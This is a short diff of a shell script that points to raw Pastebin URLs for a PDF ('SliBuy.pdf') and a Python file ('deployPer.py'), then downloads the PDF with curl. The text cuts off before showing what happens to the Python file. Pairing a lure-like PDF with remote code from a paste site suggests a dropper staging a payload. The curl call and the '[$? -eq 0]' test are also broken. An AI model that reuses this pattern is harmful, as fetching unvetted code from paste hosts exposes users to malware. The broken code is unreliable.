@@ -1,14 +1,14 @@
 #!/bin/sh
 
-pdfUrl = "GIT_PDF_URL"
-pdfOutput = "/tmp/SliBuy.pdf"
+pdfUrl="pastebin.com/raw/tzDdnTvy"
+pdfOutput="SliBuy.pdf"
 
-kupaTroopaUrl = "https://pastebin.com/raw/bPWB8Tu1"
-kupaTroopa = "deployPer.py"
+kupaTroopaUrl="https://pastebin.com/raw/bPWB8Tu1"
+kupaTroopa="deployPer.py"
 
 
 echo "Downloading pdf..."
-curl -o "$pdfUrl" "$pdfOutput"
+curl -O "$pdfOutput" "$pdfUrl"
 if [$? -eq 0]; then
     echo "PDF downloaded"
 else
